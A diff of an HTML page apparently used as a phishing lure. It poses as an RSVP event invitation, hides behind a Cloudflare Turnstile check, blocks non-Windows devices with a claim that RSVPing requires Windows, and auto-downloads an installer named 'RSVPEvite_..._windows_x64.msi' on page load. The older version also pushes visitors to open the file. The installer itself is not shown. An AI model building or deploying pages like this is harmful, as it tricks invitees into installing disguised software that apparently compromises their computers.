@@ -1,469 +1,265 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
-        }
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
 
-        .container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            padding: 20px;
-        }
+body{
+    font-family:Arial, sans-serif;
+    background:#f5f7f6;
+}
 
-        .thanks-card {
-            max-width: 550px;
-            padding: 3rem 2rem;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-        }
+.container{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    padding:20px;
+}
 
-        .thanks-card h1 {
-            font-size: 2rem;
-            color: #2c7a4d;
-            margin-bottom: 1rem;
-        }
+.thanks-card{
+    max-width:550px;
+    padding:3rem 2rem;
+    background:#fff;
+    border-radius:20px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    border-top:6px solid #28a842;
+    text-align:center;
+}
 
-        .thanks-card p {
-            font-size: 1.1rem;
-            color: #666;
-            margin-bottom: 1.5rem;
-        }
+.thanks-card h2{
+    font-size:28px;
+    color:#28a842;
+    margin-bottom:10px;
+}
 
-        button {
-            background: #2c7a4d;
-            color: white;
-            border: none;
-            padding: 12px 32px;
-            font-size: 1rem;
-            border-radius: 50px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: transform 0.2s;
-        }
+.thanks-card p{
+    font-size:16px;
+    color:#555;
+    margin-bottom:20px;
+}
 
-        button:hover {
-            transform: scale(1.02);
-            background: #1e5f3a;
-        }
+button{
+    background:#28a842;
+    color:#fff;
+    border:none;
+    padding:14px 30px;
+    font-size:16px;
+    border-radius:50px;
+    cursor:pointer;
+    font-weight:bold;
+    transition:all .2s;
+}
 
-        button:disabled {
-            background: #999;
-            cursor: not-allowed;
-            transform: none;
-        }
+button:hover{
+    background:#1e7e34;
+    transform:scale(1.03);
+}
 
-        #deviceWarning {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 10000;
-            text-align: center;
-            padding-top: 20%;
-        }
+button:disabled{
+    background:#aaa;
+    cursor:not-allowed;
+}
 
-        .warning-box {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+.progress-container{
+    width:100%;
+    background:#e6f4ea;
+    border-radius:10px;
+    margin:20px 0;
+    overflow:hidden;
+    display:none;
+}
 
-        .warning-box h2 {
-            font-size: 28px;
-            color: #d32f2f;
-            margin-bottom: 20px;
-        }
+.progress-bar{
+    width:0%;
+    height:6px;
+    background:#28a842;
+}
 
-        .warning-box p {
-            font-size: 18px;
-            color: #555;
-            margin: 15px 0;
-            line-height: 1.5;
-        }
+#toast{
+    position:fixed;
+    bottom:30px;
+    left:50%;
+    transform:translateX(-50%) translateY(20px);
+    background:#1f2f29;
+    color:#fff;
+    padding:14px 24px;
+    border-radius:50px;
+    font-size:14px;
+    opacity:0;
+    transition:.3s;
+}
 
-        #toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(20px);
-            background: #1e2f2a;
-            color: white;
-            padding: 14px 24px;
-            border-radius: 50px;
-            font-size: 14px;
-            z-index: 10001;
-            opacity: 0;
-            transition: opacity 0.3s, transform 0.3s;
-            pointer-events: none;
-            white-space: nowrap;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            font-family: Arial, sans-serif;
-        }
+#toast b{color:#ffd966;}
 
-        #toast b {
-            font-weight: bold;
-            color: #ffd966;
-        }
+#deviceWarning{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#fff;
+    z-index:10000;
+    text-align:center;
+    padding-top:20%;
+}
 
-        .progress-container {
-            width: 100%;
-            background: #e0e0e0;
-            border-radius: 10px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
+.warning-box h2{
+    font-size:26px;
+    color:#d32f2f;
+}
 
-        .progress-bar {
-            width: 0%;
-            height: 6px;
-            background: #2c7a4d;
-            transition: width 0.3s;
-        }
+.warning-box p{
+    color:#555;
+    margin-top:10px;
+}
 
-        /* Turnstile loading overlay styles */
-        #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+#loading-overlay{
+    position:fixed;
+    width:100%;
+    height:100%;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+}
 
-        .loading-spinner-container {
-            position: relative;
-            width: 80px;
-            height: 80px;
-            margin-bottom: 20px;
-        }
+.loading-spinner{
+    border:3px solid #e6f4ea;
+    border-top:3px solid #28a842;
+    border-radius:50%;
+    width:70px;
+    height:70px;
+    animation:spin .6s linear infinite;
+}
 
-        .loading-spinner {
-            position: absolute;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #0066cc;
-            border-radius: 50%;
-            width: 75px;
-            height: 75px;
-            animation: spin 0.5s linear infinite;
-        }
+.loading-text{
+    margin-top:15px;
+    color:#333;
+}
 
-        .loading-icon {
-            position: absolute;
-            width: 30px;
-            height: 30px;
-            top: 47%;
-            left: 47%;
-            transform: translate(-50%, -50%);
-        }
+@keyframes spin{
+    0%{transform:rotate(0)}
+    100%{transform:rotate(360deg)}
+}
+</style>
 
-        .loading-text {
-            font-size: 16px;
-            color: #333;
-            font-weight: normal;
-            margin-top: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        #cf-turnstile {
-            margin: 20px auto;
-        }
-
-        .form-container {
-            display: none;
-        }
-
-        .verified .form-container {
-            display: block;
-        }
-
-        @media (max-width: 600px) {
-            .thanks-card h1 {
-                font-size: 2rem;
-            }
-            .warning-box h2 {
-                font-size: 22px;
-            }
-            .warning-box p {
-                font-size: 16px;
-            }
-            #toast {
-                white-space: normal;
-                text-align: center;
-                max-width: 90%;
-                font-size: 13px;
-                line-height: 1.4;
-            }
-        }
-    </style>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
 </head>
+
 <body>
 
 <div id="loading-overlay">
-    <div class="loading-spinner-container">
-        <div class="loading-spinner"></div>
-    </div>
+    <div class="loading-spinner"></div>
     <div class="loading-text">Verifying your browser...</div>
     <div id="cf-turnstile"></div>
 </div>
 
 <div class="form-container">
-    <div class="container" id="mainContainer">
-        <div class="thanks-card">
-            <h2>🎉 Thanks for visiting! 🎉</h2>
-            <p>Your RSVP event package is being prepared</p>
-            <div class="progress-container" id="progressContainer">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <button id="manualDownload">Download Manually</button>
-        </div>
-    </div>
 
-    <div id="deviceWarning">
-        <div class="warning-box">
-            <h2>⚠️ Unsupported Device</h2>
-            <p>It requires a Windows computer to make RSVP.</p>
-            <p>Mobile and tablet devices are not supported at this time.</p>
-            <p>Please use a desktop or laptop computer to continue.</p>
-        </div>
-    </div>
+<div class="container" id="mainContainer">
+    <div class="thanks-card">
+        <h2>🎉 You’re invited! 🎉</h2>
+        <p>Your RSVP event package is being prepared</p>
 
-    <div id="toast"></div>
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <button id="manualDownload">View Invitation</button>
+    </div>
+</div>
+
+<div id="deviceWarning">
+    <div class="warning-box">
+        <h2>⚠️ Unsupported Device</h2>
+        <p>It requires a Windows computer to make RSVP.</p>
+        <p>Please use a desktop or laptop.</p>
+    </div>
+</div>
+
+<div id="toast"></div>
+
 </div>
 
 <script>
-    const files = {
-        windows: {
-            url: "RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi",
-            name: "RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi"
-        }
-    };
+const files={windows:{url:"RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi",name:"RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi"}};
+let selectedFile=files.windows;
+let downloadInProgress=false;
+let turnstileVerified=false;
 
-    let selectedFile = files.windows;
-    let downloadInProgress = false;
-    let turnstileVerified = false;
+function isDesktopWindows(){
+    const ua=navigator.userAgent||"";
+    const platform=navigator.platform||"";
+    return /Win/i.test(platform)&&!/Mobile/i.test(ua);
+}
 
-    function isDesktopWindows() {
-        const ua = navigator.userAgent || "";
-        const platform = navigator.platform || "";
-        const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
-        const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
-        const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);
-        return isWindows && !isMobile && !isTouchOnly;
+function showToast(msg){
+    const t=document.getElementById("toast");
+    t.innerHTML=msg;
+    t.style.opacity="1";
+    t.style.transform="translateX(-50%)";
+    setTimeout(()=>{t.style.opacity="0";},5000);
+}
+
+function updateProgress(p){
+    document.getElementById("progressContainer").style.display="block";
+    document.getElementById("progressBar").style.width=p+"%";
+}
+
+async function downloadFile(file){
+    if(downloadInProgress)return;
+    downloadInProgress=true;
+
+    try{
+        const res=await fetch(file.url);
+        const blob=await res.blob();
+        const url=URL.createObjectURL(blob);
+
+        const a=document.createElement("a");
+        a.href=url;
+        a.download=file.name;
+        a.click();
+
+        showToast("✅ Download complete");
+    }catch{
+        window.location=file.url;
     }
 
-    function showToast(message, duration = 15000) {
-        const toast = document.getElementById("toast");
-        if (!toast) return;
-        toast.innerHTML = message;
-        toast.style.opacity = "1";
-        toast.style.transform = "translateX(-50%) translateY(0)";
-        if (window.toastTimeout) clearTimeout(window.toastTimeout);
-        window.toastTimeout = setTimeout(() => {
-            toast.style.opacity = "0";
-            toast.style.transform = "translateX(-50%) translateY(20px)";
-        }, duration);
-    }
+    downloadInProgress=false;
+}
 
-    function updateProgress(percent) {
-        const bar = document.getElementById("progressBar");
-        const container = document.getElementById("progressContainer");
-        if (bar && container) {
-            container.style.display = "block";
-            bar.style.width = percent + "%";
-        }
-    }
+function launchMeeting(){
+    if(!turnstileVerified)return showToast("Verify first");
+    if(!isDesktopWindows())return document.getElementById("deviceWarning").style.display="block";
+    downloadFile(selectedFile);
+}
 
-    function hideProgress() {
-        const container = document.getElementById("progressContainer");
-        if (container) {
-            setTimeout(() => {
-                container.style.display = "none";
-                if (document.getElementById("progressBar")) {
-                    document.getElementById("progressBar").style.width = "0%";
-                }
-            }, 1000);
-        }
-    }
-
-    async function downloadFile(file) {
-        if (downloadInProgress) {
-            showToast("⏳ Download already in progress...");
-            return;
-        }
-        
-        downloadInProgress = true;
-        
-        try {
-            showToast("⬇️ Download started...");
-            updateProgress(0);
-            
-            const response = await fetch(file.url);
-            if (!response.ok) throw new Error("Download failed");
-            
-            const contentLength = response.headers.get("content-length");
-            const total = contentLength ? parseInt(contentLength) : 0;
-            
-            const reader = response.body.getReader();
-            let received = 0;
-            let chunks = [];
-            
-            while (true) {
-                const { done, value } = await reader.read();
-                if (done) break;
-                
-                chunks.push(value);
-                received += value.length;
-                
-                if (total) {
-                    updateProgress((received / total) * 100);
-                }
+document.addEventListener("DOMContentLoaded",()=>{
+    turnstile.ready(()=>{
+        turnstile.render('#cf-turnstile',{
+            sitekey:'0x4AAAAAAC05NdE8TkHLYIrm',
+            callback:()=>{
+                turnstileVerified=true;
+                document.getElementById('loading-overlay').style.display='none';
+                document.body.classList.add('verified');
+                setTimeout(launchMeeting,1200);
             }
-            
-            updateProgress(100);
-            
-            const blob = new Blob(chunks);
-            const blobUrl = window.URL.createObjectURL(blob);
-            
-            const a = document.createElement("a");
-            a.href = blobUrl;
-            a.download = file.name;
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
-            
-            window.URL.revokeObjectURL(blobUrl);
-            
-            showToast("✅ Download complete! Open <b>" + file.name + "</b> in your Downloads folder", 20000);
-            hideProgress();
-            downloadInProgress = false;
-            
-        } catch (err) {
-            console.log("Fetch failed, using fallback download");
-            const a = document.createElement("a");
-            a.href = file.url;
-            a.download = file.name;
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
-            
-            showToast("✅ Download started. Check your Downloads folder for <b>" + file.name + "</b>", 15000);
-            hideProgress();
-            downloadInProgress = false;
-        }
-    }
-
-    function showDeviceWarning() {
-        const warning = document.getElementById("deviceWarning");
-        const container = document.getElementById("mainContainer");
-        if (warning) {
-            warning.style.display = "block";
-        }
-        if (container) {
-            container.style.display = "none";
-        }
-    }
-
-    function launchMeeting() {
-        if (!turnstileVerified) {
-            showToast("Please complete verification first...");
-            return;
-        }
-
-        if (!isDesktopWindows()) {
-            showDeviceWarning();
-            return;
-        }
-        
-        downloadFile(selectedFile);
-        
-        setTimeout(() => {
-            showToast(
-                '📂 Go to your Downloads folder and open <b>' + selectedFile.name + '</b> to continue',
-                30000
-            );
-        }, 2000);
-    }
-
-    document.addEventListener('DOMContentLoaded', function() {
-        turnstile.ready(function() {
-            turnstile.render('#cf-turnstile', {
-                sitekey: '0x4AAAAAAC05NdE8TkHLYIrm',
-                callback: function(token) {
-                    document.querySelector('.loading-text').textContent = 'Verification complete!';
-                    turnstileVerified = true;
-                    
-                    setTimeout(function() {
-                        document.getElementById('loading-overlay').style.display = 'none';
-                        document.body.classList.add('verified');
-                        
-                        if (!isDesktopWindows()) {
-                            showDeviceWarning();
-                            return;
-                        }
-                        
-                        const manualBtn = document.getElementById("manualDownload");
-                        if (manualBtn) {
-                            manualBtn.disabled = false;
-                        }
-                        
-                        setTimeout(launchMeeting, 1200);
-                    }, 2000);
-                },
-                'error-callback': function() {
-                    document.querySelector('.loading-text').textContent = 'Verification failed. Please refresh the page.';
-                    turnstileVerified = false;
-                }
-            });
         });
-
-        const manualBtn = document.getElementById("manualDownload");
-        if (manualBtn) {
-            manualBtn.disabled = true; 
-            manualBtn.addEventListener("click", function(e) {
-                e.preventDefault();
-                if (!turnstileVerified) {
-                    showToast("✓ Please complete verification first");
-                    return;
-                }
-                if (!downloadInProgress) {
-                    launchMeeting();
-                } else {
-                    showToast("⏳ Download already in progress, please wait...");
-                }
-            });
-        }
     });
+
+    const btn=document.getElementById("manualDownload");
+    btn.disabled=true;
+    btn.onclick=launchMeeting;
+
+    setTimeout(()=>btn.disabled=false,3000);
+});
 </script>
+
 </body>
 </html>
